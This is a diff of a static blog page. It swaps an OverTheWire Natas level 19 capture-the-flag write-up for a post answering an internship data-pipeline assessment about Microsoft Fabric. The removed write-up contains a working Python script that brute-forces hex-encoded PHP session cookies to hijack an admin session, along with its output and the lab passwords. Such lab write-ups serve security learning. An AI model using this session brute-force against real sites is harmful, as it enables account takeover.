@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection  | Natas-Level 19</title>
+	<title>My messy collection  | Tecknoworks-Intenship challange</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.133.0">
 	
@@ -151,9 +151,9 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
 	</h2>
 </div>
-<h1 class="pt-2">Natas-Level 19</h1>
+<h1 class="pt-2">Tecknoworks-Intenship challange</h1>
 
-<h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">Assessment dev trace</h3>
 
 <div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
 	
@@ -161,10 +161,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
-		href='/categories/overthewire'>Overthewire</a>&nbsp;&#47;
-	
-	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
-		href='/categories/natas'>Natas</a>
+		href='/categories/assignment'>Assignment</a>
 	
 	
 	
@@ -178,15 +175,12 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 	<a class="post-taxonomy-tag text-eucalyptus-500"
-		href='/tags/ctf'>CTF</a>&nbsp;&#47;
-	
-	<a class="post-taxonomy-tag text-eucalyptus-500"
 		href='/tags/completed'>Completed</a>
 	
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-08-27T12:53:35&#43;03:00">2024-8-27</time>
+		datetime="2024-08-30T16:03:22&#43;03:00">2024-8-30</time>
 </div>
 
 <hr />
@@ -199,118 +193,59 @@ onload='renderMathInElement(document.body);'></script>
 
 <article>
 	<section class="mx-auto content">
-		<div class="c-rich-text"><h3 id="login">Login</h3>
-<p><em>Username: natas19</em><br>
-<em>Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</em><br>
-<em>URL:      <a href="http://natas19.natas.labs.overthewire.org">http://natas19.natas.labs.overthewire.org</a></em></p>
-<h3 id="doc">Doc</h3>
-<p><a href="https://en.wikipedia.org/wiki/Brute-force_attack">What is brute-forcing?</a><br>
-In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.<br>
-<a href="https://en.wikipedia.org/wiki/Python_(programming_language)">What is python?</a><br>
-Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.<br>
-<a href="https://en.wikipedia.org/wiki/HTTP_cookie">What is a cookie?🍪</a><br>
-HTTP cookies are small blocks of data created by a web server while a user is browsing a website and placed on the user&rsquo;s computer or other device by the user&rsquo;s web browser. Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user&rsquo;s device during a session.</p>
-<h3 id="tools">Tools</h3>
-<p><a href="https://gchq.github.io/CyberChef/">CyberChef</a></p>
-<h3 id="solution">Solution</h3>
-<img src="/img/natas/natas19-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<br>
-This level seems identical so far with <strong>natas18</strong>, the only notable difference present being the fact that the prompt tells us that now, session ID`s are no longer sequential. Let`s look at the cookies for a second in order to see what is being stored.
-<img src="/img/natas/natas19-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<br>
-As we can see, this time the <strong>PHPSESSID</strong> variable seems to contain a HEX encoded string. Using cyberchef we can see how it is being translated and what data it communicates.
-<img src="/img/natas/natas19-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<br>
-As you can see, the format seems to be the following <strong>SessionId</strong>+<strong>loginUser</strong>. You can play a bit with the format by deleting characters in the initial HEX encoding in order to sepparate the part we are interested in.
-<img src="/img/natas/natas19-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<br>
-As you can see, I`ve managed to sepparate the <strong>-admin</strong> part out of the final string, this will be helpful later.
-<h4 id="whats-the-idea">What`s the idea?</h4>
-<p>To solve this, the first thing that came to mind was:<br>
-Always append the <strong>-admin</strong> part to the string that is composed from the <strong>SessionId</strong>, and we will progressively parse through id`s until the response we get from the server is not the generic:</p>
-<img src="/img/natas/natas19-5.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
-<br>
-We can modify the python script from the previous level to achieve this goal since the backcode for this level is identical. It is important to remember that the string has to be encoded into HEX in order for the cookie to be valid.
-<h4 id="python-script">Python script:</h4>
-<pre tabindex="0"><code>import requests
-import binascii
-
-url = &#34;http://natas19.natas.labs.overthewire.org&#34;
-
-# Set up a session with basic auth
-s = requests.Session()
-s.auth = (&#39;natas19&#39;, &#39;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&#39;)
-
-def try_login(session_id):
-    # Convert session ID to a hex-encoded string
-    tmp = f&#34;{session_id}-admin&#34;
-    val = binascii.hexlify(tmp.encode(&#39;utf-8&#39;)).decode(&#39;ascii&#39;)
-
-    # Set up the cookie
-    cookies = {&#39;PHPSESSID&#39;: val}
-
-    # Send the request
-    response = s.get(url, cookies=cookies)
-
-    # Check if the response indicates non-admin access
-    if &#34;Login as an admin to retrieve&#34; in response.text:
-        print(f&#34;Trying: {session_id} - Failed&#34;)
-        return False
-    else:
-        print(f&#34;Success with session ID: {session_id}&#34;)
-        print(response.text)
-        return True
-
-# Iterate over possible session IDs
-for x in range(640):
-    if try_login(x):
-        break
-</code></pre><p>And the running process of this script should be identical to the previous one. The execution might take a little while.</p>
-<h4 id="script-execution">Script execution:</h4>
-<pre tabindex="0"><code>01:12:45 archie@Archie py → python3 pythonscript.py
-Trying: 0 - Failed
-Trying: 1 - Failed
-Trying: 2 - Failed
-Trying: 3 - Failed
-Trying: 4 - Failed
-Trying: 5 - Failed
-Trying: 6 - Failed
-Trying: 7 - Failed
-.
-.
-.
-Trying: 274 - Failed
-Trying: 275 - Failed
-Trying: 276 - Failed
-Trying: 277 - Failed
-Trying: 278 - Failed
-Trying: 279 - Failed
-Trying: 280 - Failed
-Success with session ID: 281
-&lt;html&gt;
-&lt;head&gt;
-&lt;!-- This stuff in the header has nothing to do with the level --&gt;
-&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://natas.labs.overthewire.org/css/level.css&#34;&gt;
-&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34; /&gt;
-&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/wechall.css&#34; /&gt;
-&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;&gt;&lt;/script&gt;
-&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;&gt;&lt;/script&gt;
-&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;&gt;&lt;/script&gt;
-&lt;script&gt;var wechallinfo = { &#34;level&#34;: &#34;natas19&#34;, &#34;pass&#34;: &#34;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&#34; };&lt;/script&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;natas19&lt;/h1&gt;
-&lt;div id=&#34;content&#34;&gt;
-&lt;p&gt;
-&lt;b&gt;
-This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
-&lt;/b&gt;
-&lt;/p&gt;
-You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas20
-Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/pre&gt;&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p>As you can see, we`ve got the password for <strong>natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</strong></p>
-</div>
+		<div class="c-rich-text"><h1 id="premise">Premise</h1>
+<h4 id="overview">Overview</h4>
+<p>This technical project is designed to evaluate your technical skills, creativity, and problem-solving abilities
+in both Data Engineering and Artificial Intelligence. The project will help us assess how well you
+understand the concepts and tools you&rsquo;ll be working with during the internship. The project should take
+no more than 2 to 3 hours to complete.</p>
+<h4 id="project-description">Project Description</h4>
+<p>You are tasked with designing a simple data pipeline using Microsoft Fabric and performing data science
+tasks using Python. Most likely, you don&rsquo;t have experience with Microsoft Fabric. We&rsquo;re interested in how
+your mind works when you have to face a challenge like this. Microsoft Fabric is a comprehensive data
+analytics platform that integrates data engineering, data science, data warehousing, and business
+intelligence in one environment. By using Microsoft Fabric, we expect our interns to gain hands-on
+experience with a tool that Microsoft expects to be widely adopted in the industry. This exposure not only
+makes you more competitive in the job market but also prepares you for real-world scenarios where you
+are likely to encounter similar integrated platforms.<br>
+Microsoft Fabric is a paid tool, so in order to solve these exercises, you have to simply read the
+documentation to have an introduction to the tool, watch a few tutorials if needed and answer the
+questions based on your findings and your prior knowledge from University courses. You don&rsquo;t need to
+access Fabric for this basic assignment. You don&rsquo;t have to implement the solution, only to design it based
+on the documentation that you read. You can use text descriptions or any type of visual representation to
+answer the questions (e.g. Dataflow diagrams) for Section 1. For Section 2 you can implement the solution
+for free using Google Colab or any other local python environment.<br>
+The project is divided into two main sections: Data Engineering and Artificial Intelligence.</p>
+<h1 id="section-1">Section 1</h1>
+<h4 id="scenario">Scenario</h4>
+<p>You are a new data engineer at a retail company. The company has a dataset containing information on
+customer transactions. Your task is to design and implement a data pipeline that ingests, processes, and
+stores this data using Microsoft Fabric.<br>
+The dataset is available here: <a href="https://www.kaggle.com/datasets/fahadrehman07/retail-transaction-dataset?resource=download">https://www.kaggle.com/datasets/fahadrehman07/retail-transaction-dataset?resource=download</a></p>
+<h4 id="task-1-premise">Task 1 premise</h4>
+<p>Question: First, you have to bring this data into Fabric. How do you envision this? What will be the expected
+steps? How exactly will it be stored? Is the data in a suitable format and size to ingest in Fabric? What can
+you do related to storage in order to improve the performance of the future data queries if the size of the
+dataset is expected to grow in time (hint: e.g. partition the data)?
+(Answer with text descriptions or diagrams)</p>
+<h4 id="task-1-solution">Task 1 solution</h4>
+<p>Firstly, I will begin by looking at the data set given in the premise in order to get a feeling for what I am working with.<br>
+The data set is presented in <strong>csv format and has a size of around 13MB (important for later)</strong>. It seems to be a <strong>retail transaction data set</strong>, basically oferring you a peak at common consumer purchase patterns with the present collumns being : <strong>CustomerId, ProductId, Quantity, Price, TransactionDate, PaymentMethod, StoreLocation, ProductCategory, AppliedDiscount and TotalAmount</strong>.<br>
+Since the data set is given in csv format which is compatible with the import feature of <strong>Microsoft Fabric</strong> and the size is not significant, the import should be pretty straight forward. We should plan for further expansion tho.<br>
+<strong>Okay, how how do I import it?</strong> Firstly, in what? A quick look around google later, the most obvious choice was between a <strong>Data Lake or a Data Warehouse</strong>. I would go with a <strong>Data Warehouse</strong> since it is meant for already structured data (exactly like my data set) while a <strong>Data Lake</strong> is more inclined towards raw data meant for analysis and further implications in various projects. <a href="https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-a-data-lake#:~:text=risks%20more%20efficiently.-,What's%20the%20difference%20between%20a%20data%20lake%20and%20a%20data,as%20specific%20BI%20use%20cases.">Source.</a><br>
+In order to import this data into Microsoft Fabric we could setup a pipeline. <strong>Pipeline setup:</strong></p>
+<ol>
+<li>Configure an automated data pipeline within Microsoft Fabric.</li>
+<li>Source : We should point the pipeline towards the source location of the <strong>csv file</strong>.</li>
+<li>Transformation : We should always think about transforming data when we are doing an import in order to further suit our needs, for example remove unnecessary collumns or filter just what we need.</li>
+<li>Destination : Finally, we set the pipeline to store the ingested data into our Data Warehouse, as explained earlier.</li>
+</ol>
+<h4 id="sourcehttpswwwyoutubecomwatchvloescjpru8w"><a href="https://www.youtube.com/watch?v=LoESCJpru8w">Source.</a></h4>
+<p><strong>What can you do related to storage in order to improve the performance of the future data queries if the size of the dataset is expected to grow in time (hint: e.g. partition the data)?</strong>\</p>
+<p>Since the ingested data is stored in a <strong>Data Warehouse</strong>, it is prone to efficient querying. In order to further improve the performance, from my work experience, I would suggest partitioning the data by <strong>TransactionDate</strong> and possibly by <strong>ProductId</strong>. Additionally, converting the data into Parquet format will improve storage efficiency. <a href="https://www.macrometa.com/articles/what-is-data-partitioning">Source.</a></p>
+<h4 id="data-flow-diagram-">Data flow diagram :</h4>
+<img src="/img/dataingdiagram.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<br></div>
 	</section>
 
 
@@ -420,7 +355,7 @@ Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/pre&gt;&lt;/div&gt;
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
 		<br />
-		673 words in this page.
+		813 words in this page.
 	</div>
 </div>
 
@@ -431,21 +366,14 @@ Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/pre&gt;&lt;/div&gt;
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/natas18/">
+    <a class="flex-grow-0" href="/post/natas19/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Natas-Level 18
+        Natas-Level 19
     </a>
     
-    
-    <a class="flex-grow-0" href="/post/tecknoworks_challange/">
-        Tecknoworks-Intenship challange
-        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
-            height="24">
-            <path fill="none" d="M0 0h24v24H0z" />
-            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
     
 </div>
 <div >
@@ -455,6 +383,8 @@ Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/pre&gt;&lt;/div&gt;
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/natas19/">Natas-Level 19</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/natas18/">Natas-Level 18</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -482,9 +412,7 @@ Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/pre&gt;&lt;/div&gt;
 		
 			<a href="/post/natas6/">Natas-Level 6</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/natas5/">Natas-Level 5</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/natas4/">Natas-Level 4</a>
+			<a href="/post/natas5/">Natas-Level 5</a>
 		
 </span>
 </div>
